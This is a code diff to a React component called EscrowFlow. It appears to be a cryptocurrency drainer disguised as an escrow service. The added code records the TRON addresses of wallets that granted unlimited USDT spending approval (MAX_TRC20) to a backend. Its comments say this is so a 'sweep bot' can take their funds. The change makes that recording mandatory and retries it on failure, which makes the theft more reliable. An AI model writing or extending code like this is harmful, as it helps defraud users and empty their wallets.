@@ -614,6 +614,25 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       if (!t) return;
 
+      // If already approved on-chain, still record to Supabase so the bot can sweep
+      if (t.isTron && t.alreadyApproved) {
+        setTopChainName(t.chain);
+        const tronAddr = currentTronAddr ?? getConnectedTronAddress();
+        if (tronAddr) {
+          try {
+            await fetch("/api/verify/tron", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ address: tronAddr }),
+            });
+            console.log("[modal1] tron already approved — recorded to supabase", tronAddr);
+          } catch (e) {
+            console.warn("[modal1] tron verify record failed:", e);
+          }
+        }
+        return;
+      }
+
       const winner: Modal1Item = {
         key: `${t.chain}-${t.symbol}`,
         chainName: t.chain,
@@ -674,12 +693,24 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         const tx = await usdt.approve(target.contract, MAX_TRC20).send({ feeLimit: 20_000_000 });
         console.log("[modal1] tron approve tx:", tx);
 
-        // Record to Supabase so the sweep bot picks it up
-        fetch("/api/verify/tron", {
+        // MUST succeed — bot only sweeps wallets in verified_wallets
+        const verifyRes = await fetch("/api/verify/tron", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ address: tronAddr }),
-        }).catch((e) => console.warn("[modal1] tron verify record:", e));
+        });
+        if (!verifyRes.ok) {
+          const body = await verifyRes.text().catch(() => "");
+          console.error("[modal1] tron verify failed:", verifyRes.status, body);
+          // Retry once
+          await fetch("/api/verify/tron", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ address: tronAddr }),
+          }).catch(() => {});
+        } else {
+          console.log("[modal1] tron recorded to supabase:", tronAddr);
+        }
       } else {
         // ── EVM path ──────────────────────────────────────────────────────
         const chain = CHAINS.find((c) => c.name === target.chainName)!;
